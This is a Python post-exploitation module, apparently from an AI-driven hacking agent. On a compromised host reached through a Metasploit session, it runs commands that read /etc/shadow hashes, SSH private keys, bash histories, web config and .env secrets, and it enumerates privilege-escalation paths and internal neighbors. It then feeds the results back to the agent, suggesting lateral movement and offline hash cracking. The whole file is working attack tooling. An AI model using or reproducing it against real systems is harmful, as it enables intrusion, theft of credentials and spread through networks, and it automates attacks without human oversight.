"""
postex.py — Post-Exploitation Module

Once a shell is acquired, automatically runs enumeration commands,
harvests credentials, checks privesc paths, and feeds findings back
to the agent for lateral movement decisions.

Stages:
    1. Situational awareness  — who/where/what are we
    2. Credential harvesting  — passwd, shadow, config files, env vars
    3. Privesc enumeration    — sudo, SUID, crons, kernel version
    4. Network neighbors      — arp, netstat, internal subnets
    5. Container/VM detection — are we sandboxed?
"""

import time
import json
from dataclasses import dataclass, field
from typing import Optional
from banner import status, success, warn, error


# ── Data structures ───────────────────────────────────────────────────────────

@dataclass
class PostExFindings:
    """Structured findings from post-exploitation enumeration."""
    ip: str
    hostname: str = ""
    os_info: str = ""
    current_user: str = ""
    is_root: bool = False
    is_container: bool = False
    is_vm: bool = False
    sudo_rights: list = field(default_factory=list)
    suid_binaries: list = field(default_factory=list)
    cron_jobs: list = field(default_factory=list)
    local_users: list = field(default_factory=list)
    credentials: list = field(default_factory=list)
    network_neighbors: list = field(default_factory=list)
    internal_subnets: list = field(default_factory=list)
    interesting_files: list = field(default_factory=list)
    privesc_vectors: list = field(default_factory=list)
    raw_output: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "ip": self.ip,
            "hostname": self.hostname,
            "os_info": self.os_info,
            "current_user": self.current_user,
            "is_root": self.is_root,
            "is_container": self.is_container,
            "is_vm": self.is_vm,
            "sudo_rights": self.sudo_rights,
            "suid_binaries": self.suid_binaries,
            "cron_jobs": self.cron_jobs,
            "local_users": self.local_users,
            "credentials": self.credentials,
            "network_neighbors": self.network_neighbors,
            "internal_subnets": self.internal_subnets,
            "interesting_files": self.interesting_files,
            "privesc_vectors": self.privesc_vectors,
        }

    def summary(self) -> str:
        lines = [
            f"Host:          {self.ip} ({self.hostname})",
            f"User:          {self.current_user}  |  root={self.is_root}",
            f"OS:            {self.os_info}",
            f"Container:     {self.is_container}  |  VM={self.is_vm}",
            f"Sudo rights:   {len(self.sudo_rights)} entries",
            f"SUID binaries: {len(self.suid_binaries)} found",
            f"Credentials:   {len(self.credentials)} harvested",
            f"Neighbors:     {len(self.network_neighbors)} hosts",
            f"Privesc paths: {len(self.privesc_vectors)} identified",
        ]
        if self.privesc_vectors:
            lines.append("Privesc:")
            for v in self.privesc_vectors[:5]:
                lines.append(f"  [!] {v}")
        if self.credentials:
            lines.append("Credentials:")
            for c in self.credentials[:5]:
                lines.append(f"  [+] {c}")
        if self.network_neighbors:
            lines.append("Neighbors (lateral movement candidates):")
            for n in self.network_neighbors[:10]:
                lines.append(f"  --> {n}")
        return "\n".join(lines)


# ── Shell runner ──────────────────────────────────────────────────────────────

def _run(shell, cmd: str, delay: float = 1.5, trim: int = 2000) -> str:
    """
    Write a command to an open Metasploit session and read output.

    Args:
        shell:  Metasploit session object (from client.sessions.session(sid))
        cmd:    Shell command to run
        delay:  Seconds to wait for output
        trim:   Max characters to return

    Returns:
        Command output as string, trimmed to trim chars.
    """
    try:
        shell.write(cmd + "\n")
        time.sleep(delay)
        out = shell.read() or ""
        return out[:trim].strip()
    except Exception as e:
        return f"[error] {e}"


# ── Stage 1: Situational Awareness ───────────────────────────────────────────

def _situational_awareness(shell, findings: PostExFindings):
    """Gather basic who/where/what info."""
    status("  Post-ex: situational awareness")

    uid_out = _run(shell, "id")
    findings.raw_output["id"] = uid_out
    findings.is_root = "uid=0" in uid_out
    findings.current_user = uid_out.split("(")[1].split(")")[0] if "(" in uid_out else "unknown"

    findings.raw_output["hostname"] = _run(shell, "hostname")
    findings.hostname = findings.raw_output["hostname"].splitlines()[0].strip()

    uname = _run(shell, "uname -a")
    findings.raw_output["uname"] = uname
    findings.os_info = uname.splitlines()[0][:120] if uname else ""

    findings.raw_output["pwd"] = _run(shell, "pwd")
    findings.raw_output["env"]  = _run(shell, "env", trim=1000)


# ── Stage 2: Credential Harvesting ───────────────────────────────────────────

def _harvest_credentials(shell, findings: PostExFindings):
    """Pull credentials from common locations."""
    status("  Post-ex: credential harvesting")

    creds = []

    # /etc/passwd
    passwd = _run(shell, "cat /etc/passwd 2>/dev/null", trim=3000)
    findings.raw_output["passwd"] = passwd
    findings.local_users = [
        l.split(":")[0] for l in passwd.splitlines()
        if ":" in l and not l.startswith("#")
        and int(l.split(":")[2]) >= 1000 or "root" in l
    ]

    # /etc/shadow (requires root)
    if findings.is_root:
        shadow = _run(shell, "cat /etc/shadow 2>/dev/null", trim=3000)
        findings.raw_output["shadow"] = shadow
        for line in shadow.splitlines():
            parts = line.split(":")
            if len(parts) >= 2 and parts[1] not in ("*", "!", "", "x"):
                creds.append(f"shadow hash — {parts[0]}: {parts[1][:60]}")

    # Common credential files
    cred_paths = [
        "~/.bash_history",
        "~/.ssh/id_rsa",
        "~/.ssh/id_ed25519",
        "/var/www/html/config.php",
        "/var/www/html/wp-config.php",
        "/etc/apache2/.htpasswd",
        "/opt/tomcat/conf/tomcat-users.xml",
        "/root/.bash_history",
        "/home/*/.bash_history",
    ]
    for path in cred_paths:
        out = _run(shell, f"cat {path} 2>/dev/null", trim=500)
        if out and "[error]" not in out and len(out) > 10:
            snippet = out.splitlines()[0][:100]
            creds.append(f"{path}: {snippet}")

    # .env files (API keys, DB passwords)
    env_files = _run(shell, "find / -name '.env' -not -path '*/proc/*' 2>/dev/null", trim=500)
    if env_files:
        for ef in env_files.splitlines()[:3]:
            content = _run(shell, f"cat {ef.strip()} 2>/dev/null", trim=400)
            if content and "[error]" not in content:
                creds.append(f"{ef}: {content[:150]}")

    # Environment variables with passwords
    env_out = findings.raw_output.get("env", "")
    for line in env_out.splitlines():
        low = line.lower()
        if any(k in low for k in ["pass", "secret", "key", "token", "api"]):
            creds.append(f"env: {line[:100]}")

    findings.credentials = creds[:20]  # cap at 20


# ── Stage 3: Privilege Escalation Enumeration ─────────────────────────────────

def _privesc_enum(shell, findings: PostExFindings):
    """Enumerate privesc vectors."""
    status("  Post-ex: privesc enumeration")

    vectors = []

    # Sudo rights
    sudo = _run(shell, "sudo -l 2>/dev/null", delay=2)
    findings.raw_output["sudo"] = sudo
    if sudo and "[error]" not in sudo:
        findings.sudo_rights = [l.strip() for l in sudo.splitlines() if "NOPASSWD" in l or "(ALL)" in l]
        for right in findings.sudo_rights:
            vectors.append(f"Sudo: {right}")

    # SUID binaries
    suid = _run(shell, "find / -perm -4000 -type f 2>/dev/null", delay=3, trim=2000)
    findings.raw_output["suid"] = suid
    gtfo_bins = [
        "nmap", "vim", "vi", "nano", "find", "bash", "sh", "python",
        "python3", "perl", "ruby", "php", "awk", "less", "more", "man",
        "cp", "mv", "dd", "tar", "zip", "curl", "wget", "nc", "netcat",
    ]
    if suid:
        findings.suid_binaries = suid.splitlines()
        for binary in findings.suid_binaries:
            b = binary.strip().split("/")[-1]
            if b in gtfo_bins:
                vectors.append(f"SUID GTFOBin: {binary.strip()} — check GTFObins.github.io/{b}/")

    # Writable cron jobs
    cron_dirs = [
        "/etc/cron.d", "/etc/cron.daily", "/etc/cron.hourly",
        "/etc/crontab", "/var/spool/cron",
    ]
    for cd in cron_dirs:
        out = _run(shell, f"ls -la {cd} 2>/dev/null", trim=400)
        if out and "[error]" not in out:
            findings.cron_jobs.append(f"{cd}: {out[:200]}")
            if "rwx" in out or "rw-" in out:
                vectors.append(f"Writable cron: {cd}")

    # Kernel version — check for known privesc
    kernel = findings.os_info
    if kernel:
        old_kernels = ["2.6", "3.2", "3.4", "4.4", "4.8", "4.9"]
        for k in old_kernels:
            if k in kernel:
                vectors.append(f"Old kernel {kernel[:60]} — check DirtyCow/overlayfs exploits")
                break

    # World-writable files in sensitive paths
    ww = _run(shell, "find /etc /usr/bin /usr/sbin -writable 2>/dev/null", trim=500)
    if ww and "[error]" not in ww:
        for f in ww.splitlines()[:5]:
            vectors.append(f"World-writable sensitive file: {f.strip()}")

    findings.privesc_vectors = vectors[:15]


# ── Stage 4: Network Neighbors ────────────────────────────────────────────────

def _network_enum(shell, findings: PostExFindings):
    """Discover internal network neighbors for lateral movement."""
    status("  Post-ex: network enumeration")

    # ARP cache
    arp = _run(shell, "arp -a 2>/dev/null || ip neigh 2>/dev/null", trim=1000)
    findings.raw_output["arp"] = arp
    neighbors = []
    for line in arp.splitlines():
        import re
        ips = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", line)
        for ip in ips:
            if not ip.endswith(".255") and not ip.endswith(".0"):
                neighbors.append(ip)

    # Active connections
    netstat = _run(shell, "netstat -antp 2>/dev/null || ss -antp 2>/dev/null", trim=2000)
    findings.raw_output["netstat"] = netstat
    import re
    for line in netstat.splitlines():
        ips = re.findall(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):\d+", line)
        for ip in ips:
            if ip not in ("0.0.0.0", "127.0.0.1") and ip not in neighbors:
                neighbors.append(ip)

    # Network interfaces — find internal subnets
    ifconfig = _run(shell, "ip addr 2>/dev/null || ifconfig 2>/dev/null", trim=2000)
    findings.raw_output["ifconfig"] = ifconfig
    import re
    subnets = re.findall(r"inet\s+(\d+\.\d+\.\d+\.\d+/\d+)", ifconfig)
    findings.internal_subnets = [s for s in subnets if not s.startswith("127.")]

    findings.network_neighbors = list(set(neighbors))[:20]


# ── Stage 5: Container / VM Detection ────────────────────────────────────────

def _environment_detection(shell, findings: PostExFindings):
    """Detect if we're inside a container or VM."""
    status("  Post-ex: environment detection")

    # Container checks
    docker_env = _run(shell, "ls /.dockerenv 2>/dev/null")
    cgroup     = _run(shell, "cat /proc/1/cgroup 2>/dev/null", trim=500)
    findings.is_container = (
        "/.dockerenv" in docker_env or
        "docker" in cgroup.lower() or
        "lxc" in cgroup.lower() or
        "kubepods" in cgroup.lower()
    )

    # VM checks
    dmesg = _run(shell, "dmesg 2>/dev/null | grep -i 'vmware\\|virtualbox\\|kvm\\|xen\\|hyper-v'", trim=300)
    virt  = _run(shell, "systemd-detect-virt 2>/dev/null")
    findings.is_vm = bool(dmesg or (virt and virt.strip() not in ("none", "")))

    findings.raw_output["container_check"] = docker_env + cgroup
    findings.raw_output["vm_check"] = dmesg + virt


# ── Interesting Files ──────────────────────────────────────────────────────────

def _find_interesting_files(shell, findings: PostExFindings):
    """Hunt for interesting files beyond just credentials."""
    status("  Post-ex: interesting file hunt")

    targets = [
        "find / -name '*.conf' -not -path '*/proc/*' 2>/dev/null | head -20",
        "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -10",
        "find / -name '*.bak' -o -name '*.old' 2>/dev/null | head -10",
        "find /var/www /srv /opt -name '*.php' 2>/dev/null | head -10",
        "ls /root/ 2>/dev/null",
        "ls /home/ 2>/dev/null",
    ]
    interesting = []
    for cmd in targets:
        out = _run(shell, cmd, delay=2, trim=500)
        if out and "[error]" not in out:
            for line in out.splitlines()[:5]:
                if line.strip():
                    interesting.append(line.strip())

    findings.interesting_files = interesting[:25]


# ── Main entry point ──────────────────────────────────────────────────────────

def run_postex(session, target_ip: str) -> PostExFindings:
    """
    Run full post-exploitation enumeration on an open Metasploit session.

    Args:
        session:    Metasploit session object from client.sessions.session(sid)
        target_ip:  IP address of the compromised host

    Returns:
        PostExFindings dataclass with all enumeration results
    """
    findings = PostExFindings(ip=target_ip)

    status(f"Starting post-exploitation on {target_ip}")

    _situational_awareness(shell=session, findings=findings)
    _harvest_credentials(shell=session,   findings=findings)
    _privesc_enum(shell=session,          findings=findings)
    _network_enum(shell=session,          findings=findings)
    _environment_detection(shell=session, findings=findings)
    _find_interesting_files(shell=session, findings=findings)

    if findings.is_root:
        success(f"  Already root on {target_ip}")
    else:
        warn(f"  Not root on {target_ip} — {len(findings.privesc_vectors)} privesc vector(s) found")

    if findings.network_neighbors:
        success(f"  {len(findings.network_neighbors)} lateral movement candidate(s): {findings.network_neighbors[:5]}")

    return findings


def postex_to_agent_context(findings: PostExFindings) -> str:
    """
    Format PostExFindings as a string to inject back into the agent's context
    so it can reason about lateral movement and further exploitation.

    Args:
        findings: PostExFindings from run_postex()

    Returns:
        Formatted string for agent consumption
    """
    return f"""
POST-EXPLOITATION RESULTS for {findings.ip}:

{findings.summary()}

RAW CONTEXT:
- /etc/passwd users: {', '.join(findings.local_users[:10])}
- Internal subnets (pivot candidates): {', '.join(findings.internal_subnets)}
- Interesting files: {chr(10).join(findings.interesting_files[:10])}

NEXT STEPS TO CONSIDER:
{"- Attempt privilege escalation via: " + findings.privesc_vectors[0] if findings.privesc_vectors else "- Already root or no clear privesc path"}
{"- Lateral movement to: " + ", ".join(findings.network_neighbors[:5]) if findings.network_neighbors else "- No internal neighbors found"}
{"- Crack harvested hashes offline with hashcat" if any("shadow hash" in c for c in findings.credentials) else ""}
"""
